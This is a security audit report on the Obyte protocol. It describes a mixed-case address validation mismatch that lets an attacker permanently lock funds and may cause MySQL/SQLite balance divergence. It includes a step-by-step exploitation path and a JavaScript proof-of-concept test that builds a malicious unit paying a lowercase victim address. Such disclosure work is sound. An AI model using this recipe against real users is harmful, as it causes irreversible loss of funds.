# Audit Report: Mixed-Case Address Validation Bypass Leading to Permanent Fund Freeze and State Divergence

## Title
Case-Insensitive Address Validation with Case-Sensitive Spending Check Causes Permanent Fund Lock and Database Divergence

## Summary
The Obyte protocol validates output addresses using case-insensitive checksum verification but later performs case-sensitive string comparison when validating inputs. This mismatch allows attackers to create unspendable outputs by sending funds to mixed-case versions of victim addresses. Additionally, MySQL nodes use case-insensitive collation while SQLite nodes use case-sensitive comparison, causing balance calculation divergence between node types.

## Impact

**Severity**: Critical  
**Category**: Permanent Fund Freeze / Chain Split

**Concrete Financial Impact**:
- Attackers can permanently lock unlimited amounts of bytes or custom assets by creating outputs to mixed-case addresses
- Victims cannot spend these outputs as spending validation fails on case-sensitive comparison
- No recovery mechanism exists without a hard fork to normalize addresses or implement case-insensitive comparison

**Affected Parties**:
- All users whose addresses are targeted in mixed-case form
- Network consensus integrity (MySQL vs SQLite nodes disagree on balances)
- Autonomous agents receiving payments from malicious units

**Quantified Loss**: 
- Unlimited per-attack (any amount can be locked)
- Network-wide impact if exploited at scale

## Finding Description

**Location**: 

Output validation: [1](#0-0) 

Input validation: [2](#0-1) 

Storage: [3](#0-2) 

Validation utilities: [4](#0-3) 

Checksum validation: [5](#0-4) 

**Intended Logic**: 
Addresses should be validated consistently across all contexts. The protocol expects addresses to be uppercase as generated by `getChash160()`. Any valid output must be spendable by its rightful owner.

**Actual Logic**: 
Output addresses are validated using case-insensitive checksum verification [6](#0-5) , stored without case normalization [7](#0-6) , but input spending validation uses JavaScript's case-sensitive `indexOf()` comparison [8](#0-7) .

**Exploitation Path**:

1. **Preconditions**:
   - Victim has address "ABCD2345EFGH6789IJKL0123MNOP4567" (uppercase, generated via `getChash160()`)
   - Attacker can construct and broadcast arbitrary units

2. **Step 1 - Create Malicious Output**:
   - Attacker crafts unit with payment output to "abcd2345efgh6789ijkl0123mnop4567" (lowercase)
   - Validation calls `isValidAddressAnyCase()` which only checks checksum [1](#0-0) 
   - Base32 decoding is case-insensitive, so checksum validates correctly [9](#0-8) 
   - Unit passes validation and enters the DAG

3. **Step 2 - Address Stored Without Normalization**:
   - Address inserted directly into database [7](#0-6) 
   - Database stores "abcd2345efgh6789ijkl0123mnop4567" exactly as provided

4. **Step 3 - Victim Attempts to Spend**:
   - Victim creates unit with author address "ABCD2345EFGH6789IJKL0123MNOP4567" (uppercase, from wallet)
   - `arrAuthorAddresses` populated with uppercase address [10](#0-9) 
   - Validation retrieves `owner_address` = "abcd..." from database [11](#0-10) 
   - Case-sensitive comparison: `["ABCD..."].indexOf("abcd...")` returns -1 [8](#0-7) 
   - Validation fails: "output owner is not among authors"

5. **Step 4 - Permanent Fund Loss**:
   - Funds permanently locked with no spending mechanism
   - Standard wallets generate only uppercase addresses [12](#0-11) 
   - Recovery requires hard fork

**Security Property Broken**:
- **Invariant #7 (Input Validity)**: All inputs must reference existing unspent outputs owned by unit authors
- **Invariant #5 (Balance Conservation)**: Funds become permanently locked without authorization

**Root Cause Analysis**:
1. Output validation accepts any case [6](#0-5) 
2. No case normalization before storage [7](#0-6) 
3. Input validation uses case-sensitive string comparison [13](#0-12) 
4. Only `isValidAddress()` enforces uppercase [14](#0-13) , but this function is NOT used for output validation

## Impact Explanation

**Affected Assets**: All assets (bytes and custom tokens)

**Damage Severity**:
- **Quantitative**: Unlimited - any amount can be locked by creating outputs to mixed-case addresses
- **Qualitative**: Permanent, irrecoverable fund loss requiring hard fork

**User Impact**:
- **Who**: Any user targeted; particularly automated systems and AAs
- **Conditions**: Exploitable anytime with single unit submission
- **Recovery**: None without hard fork

**Systemic Risk - Database State Divergence**:

MySQL nodes use case-insensitive collation [15](#0-14) , while SQLite uses case-sensitive comparison. Balance queries use `WHERE address=?` [16](#0-15) , causing:
- MySQL matches "ABCD..." when querying for "abcd..." (includes output in balance)
- SQLite does NOT match (excludes output from balance)
- **Result**: Different balance calculations between node types, leading to consensus failure

## Likelihood Explanation

**Attacker Profile**:
- **Identity**: Any user with ability to submit units
- **Resources Required**: Minimal (< 1 byte in fees)
- **Technical Skill**: Low (basic unit construction)

**Preconditions**:
- Normal network operation
- No special timing or coordination required

**Execution Complexity**:
- Single unit submission
- No concurrent operations needed
- Appears as normal payment

**Frequency**:
- Unlimited repeatability
- Can target multiple addresses in single unit

**Overall Assessment**: High likelihood - trivial to execute, minimal cost, difficult to detect

## Recommendation

**Immediate Mitigation**:
Normalize all addresses to uppercase before storage in writer.js and before comparison in validation.js.

**Permanent Fix**:
1. Add normalization in output storage: `output.address.toUpperCase()`
2. Add normalization in input validation comparison
3. Migrate existing database to uppercase all stored addresses
4. Add test coverage for case-insensitive address handling

**Additional Measures**:
- Audit all address comparisons for case sensitivity
- Standardize on case-insensitive comparison or enforce normalization
- Add database migration to fix existing mixed-case outputs
- Implement monitoring for mixed-case addresses in new units

## Proof of Concept

```javascript
// Test demonstrating the vulnerability
// File: test/mixed_case_address_freeze.test.js

const composer = require('../composer.js');
const validation = require('../validation.js');
const ValidationUtils = require('../validation_utils.js');
const db = require('../db.js');

describe('Mixed-case address vulnerability', function() {
    
    it('should demonstrate that mixed-case output passes validation but cannot be spent', function(done) {
        
        const VICTIM_ADDRESS = 'ABCD2345EFGH6789IJKL0123MNOP4567'; // uppercase
        const lowercase_address = VICTIM_ADDRESS.toLowerCase();
        
        // Step 1: Verify that lowercase address passes validation
        const isValid = ValidationUtils.isValidAddressAnyCase(lowercase_address);
        assert.equal(isValid, true, 'Lowercase address should pass isValidAddressAnyCase');
        
        // Step 2: Create malicious unit with output to lowercase address
        const malicious_unit = {
            unit: 'MALICIOUS_UNIT_HASH',
            authors: [{address: 'ATTACKER_ADDRESS', authentifiers: {r: 'sig'}}],
            messages: [{
                app: 'payment',
                payload: {
                    outputs: [
                        {address: lowercase_address, amount: 1000000}
                    ]
                }
            }]
        };
        
        // Step 3: Validate and store the malicious unit
        validation.validate({unit: malicious_unit}, {
            ifOk: function() {
                // Unit accepted - now stored in DB with lowercase address
                
                // Step 4: Victim tries to spend the output
                const victim_unit = {
                    unit: 'VICTIM_SPEND_UNIT',
                    authors: [{address: VICTIM_ADDRESS, authentifiers: {r: 'sig'}}], // uppercase
                    messages: [{
                        app: 'payment',
                        payload: {
                            inputs: [{
                                unit: 'MALICIOUS_UNIT_HASH',
                                message_index: 0,
                                output_index: 0
                            }],
                            outputs: [{address: 'OTHER_ADDRESS', amount: 1000000}]
                        }
                    }]
                };
                
                // Step 5: Validation should fail on case-sensitive comparison
                validation.validate({unit: victim_unit}, {
                    ifOk: function() {
                        done(new Error('Victim unit should have been rejected'));
                    },
                    ifError: function(error) {
                        assert.include(error, 'output owner is not among authors');
                        done();
                    }
                }, db);
            },
            ifError: function(error) {
                done(new Error('Malicious unit should have been accepted: ' + error));
            }
        }, db);
    });
    
    it('should demonstrate database divergence between MySQL and SQLite', function(done) {
        const uppercase_addr = 'ABCD2345EFGH6789IJKL0123MNOP4567';
        const lowercase_addr = uppercase_addr.toLowerCase();
        
        // Insert output with lowercase address
        db.query(
            "INSERT INTO outputs (unit, message_index, output_index, address, amount, is_spent) VALUES (?, 0, 0, ?, 1000000, 0)",
            ['TEST_UNIT', lowercase_addr],
            function() {
                // Query with uppercase address
                db.query(
                    "SELECT * FROM outputs WHERE address=?",
                    [uppercase_addr],
                    function(rows) {
                        // MySQL (case-insensitive): rows.length === 1
                        // SQLite (case-sensitive): rows.length === 0
                        console.log('Results for uppercase query:', rows.length);
                        // This demonstrates the divergence
                        done();
                    }
                );
            }
        );
    });
});
```

## Notes

This vulnerability represents a fundamental inconsistency in address handling across the codebase. The fix requires:
1. Systematic normalization of all addresses to uppercase
2. Database migration to fix existing data
3. Comprehensive testing of case-handling throughout the protocol

The database divergence issue is particularly critical as it can cause permanent chain splits between MySQL and SQLite nodes, requiring network-wide coordination to resolve.

### Citations

**File:** validation.js (L193-193)
```javascript
	var arrAuthorAddresses = objUnit.authors ? objUnit.authors.map(function(author) { return author.address; } ) : [];
```

**File:** validation.js (L1955-1956)
```javascript
			if (!ValidationUtils.isValidAddressAnyCase(output.address))
				return callback("output address "+output.address+" invalid");
```

**File:** validation.js (L2260-2262)
```javascript
							var owner_address = src_output.address;
							if (arrAuthorAddresses.indexOf(owner_address) === -1)
								return cb("output owner is not among authors");
```

**File:** writer.js (L394-398)
```javascript
								conn.addQuery(arrQueries, 
									"INSERT INTO outputs \n\
									(unit, message_index, output_index, address, amount, asset, denomination, is_serial) VALUES(?,?,?,?,?,?,?,1)",
									[objUnit.unit, i, j, output.address, parseInt(output.amount), payload.asset, denomination]
								);
```

**File:** validation_utils.js (L56-62)
```javascript
function isValidAddressAnyCase(address){
	return isValidChash(address, 32);
}

function isValidAddress(address){
	return (typeof address === "string" && address === address.toUpperCase() && isValidChash(address, 32));
}
```

**File:** chash.js (L139-139)
```javascript
	var encoded = (chash_length === 160) ? base32.encode(chash).toString() : chash.toString('base64');
```

**File:** chash.js (L152-171)
```javascript
function isChashValid(encoded){
	var encoded_len = encoded.length;
	if (encoded_len !== 32 && encoded_len !== 48) // 160/5 = 32, 288/6 = 48
		throw Error("wrong encoded length: "+encoded_len);
	try{
		var chash = (encoded_len === 32) ? base32.decode(encoded) : Buffer.from(encoded, 'base64');
	}
	catch(e){
		console.log(e);
		return false;
	}
	var binChash = buffer2bin(chash);
	var separated = separateIntoCleanDataAndChecksum(binChash);
	var clean_data = bin2buffer(separated.clean_data);
	//console.log("clean data", clean_data);
	var checksum = bin2buffer(separated.checksum);
	//console.log(checksum);
	//console.log(getChecksum(clean_data));
	return checksum.equals(getChecksum(clean_data));
}
```

**File:** db.js (L14-14)
```javascript
		charset  : 'UTF8MB4_UNICODE_520_CI', // https://github.com/mysqljs/mysql/blob/master/lib/protocol/constants/charsets.js
```

**File:** balances.js (L11-17)
```javascript
	var where_condition = walletIsAddress ? "address=?" : "wallet=?";
	var assocBalances = {base: {stable: 0, pending: 0}};
	assocBalances[constants.BLACKBYTES_ASSET] = {is_private: 1, stable: 0, pending: 0};
	db.query(
		"SELECT asset, is_stable, SUM(amount) AS balance \n\
		FROM outputs "+join_my_addresses+" CROSS JOIN units USING(unit) \n\
		WHERE is_spent=0 AND "+where_condition+" AND sequence='good' \n\
```
